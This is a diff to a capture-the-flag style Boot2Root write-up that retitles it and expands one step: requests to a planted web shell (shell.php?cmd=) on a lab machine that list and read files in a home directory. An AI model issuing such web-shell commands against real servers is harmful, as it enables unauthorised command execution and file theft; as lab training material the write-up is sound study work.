@@ -1,4 +1,4 @@
-# Boot2Root - Writeup 1
+# Boot2Root - Writeup 2
 
 ## Summary
 
@@ -170,10 +170,18 @@ Output:
 LOOKATME  ft_root  laurie  laurie@borntosec.net  lmezard  thor  zaz
 ```
 
-### Reading the LOOKATME directory
+### the LOOKATME directory
 
+
+First listed what was inside:
 ```
-?cmd=cat /home/LOOKATME/*
+http://192.168.128.4/forum/templates_c/shell.php?cmd=ls%20/home/LOOKATME
+```
+
+Then read all files inside:
+```
+http://192.168.128.4/forum/templates_c/shell.php?cmd=cat%20/home/LOOKATME/*
+
 ```
 
 Output:
